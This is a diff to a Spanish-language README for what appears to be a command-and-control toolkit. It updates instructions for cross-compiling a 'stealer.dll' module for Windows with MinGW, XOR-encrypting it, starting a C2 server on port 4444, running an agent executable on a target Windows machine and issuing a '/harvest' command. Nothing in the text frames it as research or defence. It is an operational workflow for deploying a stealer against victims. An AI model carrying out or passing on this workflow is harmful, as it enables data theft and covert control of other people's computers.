@@ -24,11 +24,23 @@ Encripta `stealer.dll` con XOR y lo prepara para ser usado con `/harvest`:
 
 ## 📋 Prerequisitos
 
-```bash
-# Compilar la DLL de stealer (solo para encrypt-module)
-cargo build --release --package stealer-dll
+### Instalar MinGW-w64 (cross-compilation para Windows)
 
-# Esto genera: target/release/stealer.dll (~2 MB)
+```bash
+# En Linux/WSL
+sudo apt install mingw-w64
+
+# Agregar target de Windows a Rust
+rustup target add x86_64-pc-windows-gnu
+```
+
+### Compilar la DLL de stealer
+
+```bash
+# IMPORTANTE: Usar --target para generar DLL (Windows), no .so (Linux)
+cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
+
+# Esto genera: target/x86_64-pc-windows-gnu/release/stealer.dll (~2 MB)
 ```
 
 ## 🚀 Uso
@@ -90,8 +102,8 @@ C2R2[1]> /harvest
 ## 🛠️ Workflow Completo
 
 ```bash
-# 1. Compilar stealer DLL
-cargo build --release --package stealer-dll
+# 1. Compilar stealer DLL (Windows target desde Linux)
+cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
 
 # 2. Encriptar módulo
 cd builder
@@ -105,6 +117,7 @@ cd ../c2r2-server
 cargo run --release -- --bind 0.0.0.0 --port 4444
 
 # 5. Ejecutar agent en target Windows
+# (Transferir my_agent.exe a Windows)
 .\my_agent.exe
 
 # 6. Desde C2, ejecutar /harvest
